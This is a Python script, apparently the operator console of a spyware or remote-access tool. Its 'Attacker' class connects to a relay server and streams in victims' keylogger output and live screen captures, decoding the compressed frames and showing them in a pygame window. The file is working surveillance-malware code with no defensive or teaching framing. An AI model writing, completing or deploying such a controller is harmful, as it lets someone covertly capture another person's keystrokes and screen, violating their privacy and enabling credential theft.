import socket
import struct
import json
import base64
import pygame
from zlib import decompress


WIDTH = 1900
HEIGHT = 1000

class Attacker():
    def __init__(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(("127.0.0.1", 8000))
        Main(self.client_socket)


class Main():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        SuperSocket(self.client_socket).send_msg(("1").encode())
        self.screen_cap = Screen()
        self.operation()
        
    def operation(self):
        while True:
            data = (SuperSocket(self.client_socket).recv_msg()).decode()
            message = json.loads(data)
            
            if message["type"] == "logger":
                print(message["data"])
                
            elif message["type"] == "screen":
                self.screen_cap.show(message["data"])
            else:
                print("wrong")

class Screen():
    def __init__(self):
        pygame.init()
        self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
        self.clock = pygame.time.Clock()
        self.watching = True
        
    def show(self, encoded_image):
        self.encoded_image = encoded_image
        try:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.watching = False
                    break
                
            image_bytes = base64.b64decode(self.encoded_image)
            decompressed_pixels = decompress(image_bytes)

            img = pygame.image.fromstring(decompressed_pixels, (WIDTH, HEIGHT), 'RGB')

            self.screen.blit(img, (0, 0))
            pygame.display.flip()
            self.clock.tick(60)
        except:
            print("error")


class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    Attacker()
